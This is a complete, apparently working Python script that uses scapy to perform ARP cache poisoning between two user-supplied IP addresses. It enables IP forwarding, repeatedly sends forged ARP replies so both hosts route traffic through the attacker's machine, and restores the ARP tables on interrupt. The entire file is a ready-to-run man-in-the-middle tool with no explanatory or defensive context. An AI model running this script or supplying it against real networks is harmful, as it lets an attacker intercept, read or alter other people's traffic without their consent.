import os
import sys
import time
from scapy.all import *

try:
    interface = raw_input("Enter Desired Interface [eth0]: ")
    if interface == "":
        interface = "eth0"
    target1 = raw_input("[*] Enter target 1 IP: ")
    target2 = raw_input("[*] Enter target 2 IP: ")
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)

print("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def undo_arp():
    print("\n[*] Restoring Targets...")
    target1_mac = get_mac(target1)
    target2_mac = get_mac(target2)
    send(ARP(op=2, pdst=target2, psrc=target1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
    send(ARP(op=2, pdst=target1, psrc=target2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)


def trick(gm, vm):
    send(ARP(op=2, pdst=target1, psrc=target2, hwdst=vm))
    send(ARP(op=2, pdst=target2, psrc=target1, hwdst=gm))


def arp_attack():
    try:
        target1_mac = get_mac(target1)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Target 1 MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        target2_mac = get_mac(target2)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Target 2 MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")
    while 1:
        try:
            trick(target2_mac, target1_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            undo_arp()
            break


arp_attack()
